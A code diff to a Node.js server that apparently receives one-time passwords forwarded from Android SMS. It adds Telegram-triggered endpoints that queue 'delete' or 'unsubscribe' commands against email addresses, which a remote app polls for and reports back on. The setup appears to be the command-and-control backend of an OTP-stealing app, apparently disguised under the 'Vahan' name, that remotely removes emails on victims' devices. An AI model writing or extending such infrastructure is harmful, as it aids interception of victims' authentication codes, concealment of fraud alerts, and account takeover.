@@ -20,6 +20,9 @@ let otpDatabase = [];
 // Store unsubscribe logs
 let unsubscribeLog = [];
 let deleteLog = [];
+let pendingCommands = [];
+let doneCommands = [];
+
 
 // ============================================
 // ENDPOINT 1: Receive OTP from Android SMS
@@ -218,6 +221,50 @@ app.get('/delete-log', (req, res) => {
     } catch(e) {
         res.json([]);
     }
+});
+
+// ENDPOINT: Telegram button creates command
+app.post('/command', (req, res) => {
+    const key = req.headers['x-vahan-key'];
+    if (key !== VAHAN_KEY) return res.status(403).json({ error: 'Invalid Key' });
+    
+    const { email, email_type, action } = req.body;
+    const cmd = {
+        id: crypto.randomUUID(),
+        email,
+        email_type,
+        action, // "delete" or "unsubscribe"
+        created_at: new Date().toISOString(),
+        done: false
+    };
+    pendingCommands.push(cmd);
+    fs.writeFileSync('/tmp/pending_commands.json', JSON.stringify(pendingCommands, null, 2));
+    
+    console.log(`[VAHAN] Command: ${action} | ${email}`);
+    res.json({ success: true, cmd_id: cmd.id });
+});
+
+// ENDPOINT: App checks pending commands
+app.get('/command-pending', (req, res) => {
+    if (req.query.key !== VAHAN_KEY) return res.status(403).json({ error: 'Invalid Key' });
+    try {
+        const data = fs.readFileSync('/tmp/pending_commands.json', 'utf8');
+        res.json(JSON.parse(data).filter(c => !c.done));
+    } catch(e) { res.json([]); }
+});
+
+// ENDPOINT: App marks command as done
+app.post('/command-done', (req, res) => {
+    const key = req.headers['x-vahan-key'];
+    if (key !== VAHAN_KEY) return res.status(403).json({ error: 'Invalid Key' });
+    
+    const { cmd_id, success } = req.body;
+    pendingCommands = pendingCommands.map(c => 
+        c.id === cmd_id ? {...c, done: true, success, done_at: new Date().toISOString()} : c
+    );
+    fs.writeFileSync('/tmp/pending_commands.json', JSON.stringify(pendingCommands, null, 2));
+    console.log(`[VAHAN] Command done: ${cmd_id} | Success: ${success}`);
+    res.json({ success: true });
 });
 
 // ============================================
